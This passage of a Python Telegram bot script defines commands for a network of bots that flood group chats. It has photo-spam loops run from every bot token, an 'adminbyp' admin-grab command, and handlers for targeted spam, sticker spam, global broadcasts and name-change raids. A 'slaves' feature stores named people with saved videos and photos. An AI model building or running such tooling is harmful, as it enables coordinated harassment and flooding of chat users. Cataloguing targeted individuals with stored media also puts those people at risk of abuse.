        await update.message.reply_text(f"✅ {update.effective_user.mention_html()} 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐝𝐦𝐢𝐧! 💀", parse_mode='HTML')
    else:
        logger.error(f"AdminByp failed - Errors: {errors}")
        # Show first unique error to user for debugging
        first_err = errors[0] if errors else "Unknown"
        await update.message.reply_text(f"⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝: {first_err}\n\n𝐌𝐚𝐤𝐞 𝐬𝐮𝐫𝐞 𝐁𝐨𝐭 𝟏 𝐢𝐬 𝐚𝐝𝐦𝐢𝐧 𝐢𝐧 𝐭𝐡𝐞 𝐆𝐑𝐎𝐔𝐏 𝐰𝐢𝐭𝐡 '𝐀𝐝𝐝 𝐍𝐞𝐰 𝐀𝐝𝐦𝐢𝐧𝐬' 𝐩𝐞𝐫𝐦!")

@only_sudo
async def slaves_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not slaves_list:
        return await update.message.reply_text("🔗 𝐒𝐋𝐀𝐕𝐄𝐒 𝐋𝐈𝐒𝐓 𝐈𝐒 𝐄𝐌𝐏𝐓𝐘!\n𝐔𝐬𝐞 /addslave <name> 𝐭𝐨 𝐚𝐝𝐝.")
    text = "⛓️ 𝐌𝐘 𝐒𝐋𝐀𝐕𝐄𝐒:\n\n"
    for i, s in enumerate(slaves_list, 1):
        name = s["name"] if isinstance(s, dict) else s
        vcount = len(s.get("videos", [])) if isinstance(s, dict) else 0
        text += f"  {i}. {name} 🎥{vcount}\n"
    text += f"\n💀 𝐓𝐨𝐭𝐚𝐥: {len(slaves_list)}"
    await update.message.reply_text(text)

@only_sudo
async def addslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /addslave <name>")
    name = " ".join(context.args)
    existing = [s["name"] if isinstance(s, dict) else s for s in slaves_list]
    if name in existing:
        return await update.message.reply_text(f"⚠️ {name} 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐬𝐥𝐚𝐯𝐞𝐬 𝐥𝐢𝐬𝐭!")
    slaves_list.append({"name": name, "videos": []})
    save_slaves()
    await update.message.reply_text(f"⛓️ {name} 𝐀𝐃𝐃𝐄𝐃 𝐓𝐎 𝐒𝐋𝐀𝐕𝐄𝐒! 💀👑")

@only_sudo
async def delslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delslave <name>")
    name = " ".join(context.args)
    idx = next((i for i, s in enumerate(slaves_list) if (s["name"] if isinstance(s, dict) else s) == name), None)
    if idx is None:
        return await update.message.reply_text(f"⚠️ {name} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐬𝐥𝐚𝐯𝐞𝐬 𝐥𝐢𝐬𝐭!")
    slaves_list.pop(idx)
    save_slaves()
    await update.message.reply_text(f"🗑️ {name} 𝐑𝐄𝐌𝐎𝐕𝐄𝐃 𝐅𝐑𝐎𝐌 𝐒𝐋𝐀𝐕𝐄𝐒.")

@only_sudo
async def showslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.bot.token != TOKENS[0]:
        return
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /showslave <number>\n𝐄𝐱: /showslave 1")
    try:
        num = int(context.args[0])
    except ValueError:
        return await update.message.reply_text("⚠️ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫.")
    if not slaves_list:
        return await update.message.reply_text("🔗 𝐒𝐋𝐀𝐕𝐄𝐒 𝐋𝐈𝐒𝐓 𝐈𝐒 𝐄𝐌𝐏𝐓𝐘!")
    if num < 1 or num > len(slaves_list):
        return await update.message.reply_text(f"⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫! 𝐑𝐚𝐧𝐠𝐞: 1-{len(slaves_list)}")
    slave = slaves_list[num - 1]
    name = slave["name"] if isinstance(slave, dict) else slave
    videos = slave.get("videos", []) if isinstance(slave, dict) else []
    header = f"⛓️ 𝐒𝐋𝐀𝐕𝐄 #{num}\n\n👤 𝐍𝐚𝐦𝐞: {name}\n🎥 𝐕𝐢𝐝𝐞𝐨𝐬: {len(videos)}"
    await update.message.reply_text(header)
    if not videos:
        await update.message.reply_text(f"📭 𝐍𝐨 𝐯𝐢𝐝𝐞𝐨𝐬 𝐬𝐚𝐯𝐞𝐝 𝐟𝐨𝐫 𝐭𝐡𝐢𝐬 𝐬𝐥𝐚𝐯𝐞 𝐲𝐞𝐭.\n𝐔𝐬𝐞 /saveslave {num} [caption] 𝐭𝐨 𝐚𝐝𝐝.")
        return
    for i, v in enumerate(videos, 1):
        file_id = v.get("file_id", "")
        caption = v.get("caption", "")
        try:
            await update.message.reply_video(video=file_id, caption=f"🎥 𝐕𝐢𝐝𝐞𝐨 #{i}" + (f"\n📝 {caption}" if caption else ""))
        except Exception as e:
            await update.message.reply_text(f"❌ 𝐕𝐢𝐝𝐞𝐨 #{i} 𝐟𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def saveslave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.bot.token != TOKENS[0]:
        return
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /saveslave <number> [caption]\n𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐯𝐢𝐝𝐞𝐨.")
    try:
        num = int(context.args[0])
    except ValueError:
        return await update.message.reply_text("⚠️ 𝐅𝐢𝐫𝐬𝐭 𝐚𝐫𝐠 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐬𝐥𝐚𝐯𝐞 𝐧𝐮𝐦𝐛𝐞𝐫.")
    if not slaves_list:
        return await update.message.reply_text("🔗 𝐒𝐋𝐀𝐕𝐄𝐒 𝐋𝐈𝐒𝐓 𝐈𝐒 𝐄𝐌𝐏𝐓𝐘! 𝐔𝐬𝐞 /addslave <name> 𝐟𝐢𝐫𝐬𝐭.")
    if num < 1 or num > len(slaves_list):
        return await update.message.reply_text(f"⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫! 𝐑𝐚𝐧𝐠𝐞: 1-{len(slaves_list)}")
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐯𝐢𝐝𝐞𝐨 𝐦𝐞𝐬𝐬𝐚𝐠𝐞!")
    reply = update.message.reply_to_message
    caption = " ".join(context.args[1:]) if len(context.args) > 1 else ""
    file_id = None
    if reply.video:
        file_id = reply.video.file_id
    elif reply.document and reply.document.mime_type and reply.document.mime_type.startswith("video"):
        file_id = reply.document.file_id
    elif reply.photo:
        file_id = reply.photo[-1].file_id
    if not file_id:
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐯𝐢𝐝𝐞𝐨/𝐩𝐡𝐨𝐭𝐨 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐫𝐞𝐩𝐥𝐢𝐞𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞!")
    slave = slaves_list[num - 1]
    if not isinstance(slave, dict):
        slaves_list[num - 1] = {"name": slave, "videos": []}
        slave = slaves_list[num - 1]
    if "videos" not in slave:
        slave["videos"] = []
    slave["videos"].append({"file_id": file_id, "caption": caption})
    save_slaves()
    name = slave["name"]
    count = len(slave["videos"])
    await update.message.reply_text(
        f"✅ 𝐕𝐢𝐝𝐞𝐨 𝐬𝐚𝐯𝐞𝐝 𝐭𝐨 {name}!\n"
        f"{'📝 𝐂𝐚𝐩𝐭𝐢𝐨𝐧: ' + caption + chr(10) if caption else ''}"
        f"🎥 𝐓𝐨𝐭𝐚𝐥 𝐯𝐢𝐝𝐞𝐨𝐬: {count}"
    )

@only_sudo
async def gnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.bot.token != TOKENS[0]:
        return
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /gnc <text>\n𝐄𝐱: /gnc Aman Keng")
    text = " ".join(context.args)
    uid = update.effective_user.id
    gnc_cache[uid] = text
    formatted = _gnc_format(text, "keng")
    await update.message.reply_text(formatted, reply_markup=_gnc_keyboard(uid))

async def gnc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    parts = query.data.split("_", 2)
    if len(parts) < 3:
        await query.answer(); return
    try:
        owner_uid = int(parts[1])
    except:
        await query.answer(); return
    if uid != owner_uid:
        await query.answer("❌ 𝐍𝐨𝐭 𝐲𝐨𝐮𝐫𝐬!", show_alert=True); return
    style_key = parts[2]
    if style_key not in GNC_STYLES:
        await query.answer("❌ 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐬𝐭𝐲𝐥𝐞", show_alert=True); return
    text = gnc_cache.get(uid)
    if not text:
        await query.answer("❌ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐔𝐬𝐞 /gnc 𝐚𝐠𝐚𝐢𝐧.", show_alert=True); return
    formatted = _gnc_format(text, style_key)
    label = GNC_STYLES[style_key][2]
    try:
        await query.edit_message_text(formatted, reply_markup=_gnc_keyboard(uid))
        await query.answer(f"✅ {label}")
    except Exception as e:
        await query.answer(f"Error: {e}", show_alert=True)

async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 𝐏𝐎𝐍𝐆! ✅")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        grp_count = len(open(GROUPS_FILE).read().split('\n')) if os.path.exists(GROUPS_FILE) else 0
    except:
        grp_count = 0
    
    status_msg = "📊 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒\n\n"
    status_msg += f"🤖 𝐀𝐂𝐓𝐈𝐕𝐄 𝐁𝐎𝐓𝐒: {len(TOKENS)}\n"
    status_msg += f"💬 𝐆𝐑𝐎𝐔𝐏𝐒 𝐌𝐎𝐍𝐈𝐓𝐎𝐑𝐄𝐃: {grp_count}\n\n"
    status_msg += "🔄 𝐀𝐂𝐓𝐈𝐕𝐄 𝐓𝐀𝐒𝐊𝐒:\n"
    status_msg += f"  ├─ 𝐍𝐂: {len(group_tasks)}\n"
    status_msg += f"  ├─ 𝐒𝐏𝐀𝐌: {len(spam_tasks)}\n"
    status_msg += f"  ├─ 𝐒𝐖𝐈𝐏𝐄: {len(swipe_tasks)}\n"
    status_msg += f"  ├─ 𝐑𝐄𝐀𝐂𝐓: {len(react_mode)}\n"
    status_msg += f"  └─ 𝐃𝐑𝐄𝐀𝐂𝐓: {len(dreact_mode)}\n\n"
    global_str = 'ON' if global_mode else 'OFF'
    status_msg += f"⚡ 𝐆𝐋𝐎𝐁𝐀𝐋 𝐌𝐎𝐃𝐄: {global_str}\n"
    status_msg += f"📈 𝐓𝐇𝐑𝐄𝐀𝐃𝐒: {current_threads}/{MAX_THREADS}"
    await update.message.reply_text(status_msg)

async def dreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 2:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /dreact <1-10> <emoji1> [emoji2] ...\n𝐄𝐱: /dreact 5 😂 ❤️ 😊")
    
    try:
        num_bots = int(context.args[0])
        if num_bots < 1 or num_bots > 10:
            return await update.message.reply_text("⚠️ 𝐍𝐮𝐦𝐛𝐞𝐫 𝐦𝐮𝐬𝐭 𝐛𝐞 1-10")
        emojis = context.args[1:]
        chat_id = update.effective_chat.id
        dreact_mode[chat_id] = {"emojis": emojis, "num_bots": min(num_bots, len(bots))}
        emoji_str = " ".join(emojis)
        await update.message.reply_text(f"✅ 𝐀𝐮𝐭𝐨 𝐑𝐞𝐚𝐜𝐭 𝐎𝐍 → {emoji_str}\n🤖 𝐁𝐨𝐭𝐬 𝐑𝐞𝐚𝐜𝐭𝐢𝐧𝐠: {min(num_bots, len(bots))}")
    except ValueError:
        await update.message.reply_text("⚠️ 𝐅𝐢𝐫𝐬𝐭 𝐚𝐫𝐠 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫 (1-10)")

async def stopdreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    dreact_mode.pop(update.effective_chat.id, None)
    await update.message.reply_text("🛑 𝐀𝐔𝐓𝐎 𝐑𝐄𝐀𝐂𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")

@only_sudo
async def setmphoto_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐰𝐢𝐭𝐡 /setmphoto [𝐦𝐞𝐬𝐬𝐚𝐠𝐞]")
    cid = update.message.chat_id
    photo_id = update.message.reply_to_message.photo[-1].file_id
    caption = " ".join(context.args) if context.args else ""

    async def photo_msg_loop(bot, c, p, cap):
        while True:
            try:
                await bot.send_photo(c, photo=p, caption=cap if cap else None)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(2)

    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(photo_msg_loop(bot, cid, photo_id, caption)) for bot in bots]
    await update.message.reply_text("📸✉️ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!" + (f"\n📝 𝐂𝐚𝐩𝐭𝐢𝐨𝐧: {caption}" if caption else ""))

@only_sudo
async def refresh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔄 𝐑𝐄𝐅𝐑𝐄𝐒𝐇𝐈𝐍𝐆 𝐁𝐎𝐓𝐒...")
    for d in [group_tasks, spam_tasks, pfp_tasks, swipe_tasks]:
        for cid in list(d.keys()):
            for t in d[cid]: t.cancel()
            del d[cid]
    react_mode.clear()
    dreact_mode.clear()
    await update.message.reply_text("✅ 𝐀𝐋𝐋 𝐓𝐀𝐒𝐊𝐒 𝐑𝐄𝐅𝐑𝐄𝐒𝐇𝐄𝐃! 𝐁𝐎𝐓𝐒 𝐀𝐋𝐈𝐕𝐄 🚀")

@only_sudo
async def setlayout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_layout
    if not context.args:
        current = custom_layout if custom_layout else "𝐃𝐞𝐟𝐚𝐮𝐥𝐭 𝐋𝐚𝐲𝐨𝐮𝐭 (𝐧𝐨𝐭 𝐜𝐮𝐬𝐭𝐨𝐦𝐢𝐳𝐞𝐝)"
        return await update.message.reply_text(f"⚠️ 𝐔𝐬𝐚𝐠𝐞: /Setlayout <𝐲𝐨𝐮𝐫 𝐥𝐚𝐲𝐨𝐮𝐭 𝐭𝐞𝐱𝐭>\n\n𝐂𝐮𝐫𝐫𝐞𝐧𝐭:\n{current}")
    custom_layout = " ".join(context.args)
    with open(LAYOUT_FILE, "w") as f:
        json.dump({"layout": custom_layout}, f)
    await update.message.reply_text(f"✅ 𝐋𝐀𝐘𝐎𝐔𝐓 𝐔𝐏𝐃𝐀𝐓𝐄𝐃! 💀\n\n{custom_layout}")

@only_sudo
async def resetlayout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global custom_layout
    custom_layout = ""
    if os.path.exists(LAYOUT_FILE):
        os.remove(LAYOUT_FILE)
    await update.message.reply_text("🔄 𝐋𝐀𝐘𝐎𝐔𝐓 𝐑𝐄𝐒𝐄𝐓 𝐓𝐎 𝐃𝐄𝐅𝐀𝐔𝐋𝐓! ✅")

@only_sudo
async def clearmphoto_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🗑️ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐇𝐎𝐓𝐎 𝐒𝐏𝐀𝐌 𝐂𝐋𝐄𝐀𝐑𝐄𝐃! ✅")

def build_app(token):
    app = Application.builder().token(token).build()
    handlers = [
        CommandHandler("start", start_cmd), CommandHandler("help", help_cmd),
        CommandHandler("ping", ping_cmd), CommandHandler("status", status_cmd),
        CommandHandler("dreact", dreact_cmd), CommandHandler("stopdreact", stopdreact_cmd),
        CommandHandler("godspeed", godspeed_cmd), CommandHandler("stopnc", stopnc_cmd),
        CommandHandler("spam", spam_cmd), CommandHandler("unspam", unspam_cmd),
        CommandHandler("imagespam", imagespam_cmd),
        CommandHandler("swipe", swipe_cmd), CommandHandler("stopswipe", stopswipe_cmd),
        CommandHandler("react", react_cmd), CommandHandler("Stopreact", stopreact_cmd),
        CommandHandler("Changename", changename_cmd), CommandHandler("Setpfp", setpfp_cmd),
        CommandHandler("changepfp", changepfp_cmd), CommandHandler("stop", stop_all_cmd),
        CommandHandler("delaync", delaync_cmd), CommandHandler("delayspam", delayspam_cmd),
        CommandHandler("globalactivate", globalactivate_cmd), CommandHandler("offglobal", offglobal_cmd),
        CommandHandler("groups", groups_cmd), CommandHandler("leaveglobal", leaveglobal_cmd),
        CommandHandler("g", global_broadcast_cmd), CommandHandler("target", targetspm_cmd),
        CommandHandler("settemplate", settemplate_cmd), CommandHandler("spamtarget", spamtarget_cmd),
        CommandHandler("stoptarget", stoptarget_cmd), CommandHandler("showtemplate", showtemplate_cmd),
        CommandHandler("akal", akal_cmd),
        CommandHandler("flagnc", flagnc_cmd), CommandHandler("heartnc", heartnc_cmd),
        CommandHandler("aestheticnc", aestheticnc_cmd), CommandHandler("vegetablenc", vegetablenc_cmd),
        CommandHandler("animalnc", animalnc_cmd), CommandHandler("stickerspam", stickerspam_cmd),
        CommandHandler("timenc", timenc_cmd), CommandHandler("kengnc", kengnc_cmd),
        CommandHandler("threads", threads_cmd), CommandHandler("getallbots", getallbots_cmd),
        CommandHandler("giveadmin", giveadmin_cmd), CommandHandler("adminbyp", adminbyp_cmd),
        CommandHandler("sudo", add_sudo_cmd), CommandHandler("listsudo", list_sudo_cmd),
        CommandHandler("delsudo", del_sudo_cmd), CommandHandler("owner", owner_cmd),
        CommandHandler("slaves", slaves_cmd), CommandHandler("addslave", addslave_cmd),
        CommandHandler("delslave", delslave_cmd), CommandHandler("showslave", showslave_cmd),
        CommandHandler("saveslave", saveslave_cmd),
        CommandHandler("gnc", gnc_cmd),
        CommandHandler("setmphoto", setmphoto_cmd), CommandHandler("clearmphoto", clearmphoto_cmd),
        CommandHandler("refresh", refresh_cmd),
        CommandHandler("Setlayout", setlayout_cmd), CommandHandler("resetlayout", resetlayout_cmd),
        CallbackQueryHandler(gnc_callback, pattern="^gnc_"),
        MessageHandler(filters.TEXT & ~filters.COMMAND, auto_replies)
    ]
    for h in handlers: app.add_handler(h)
    return app

bots = [Application.builder().token(t).build().bot for t in TOKENS]

async def run_bots():
    load_data()
    load_slaves()
    global bot_usernames
    bot_usernames = []
    for b in bots:
        try:
            me = await b.get_me()
            bot_usernames.append(me.username)
        except: pass
    apps = [build_app(t) for t in TOKENS]
    for app in apps:
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
    print("🚀 BOTS RUNNING!")
    while True: await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(run_bots())
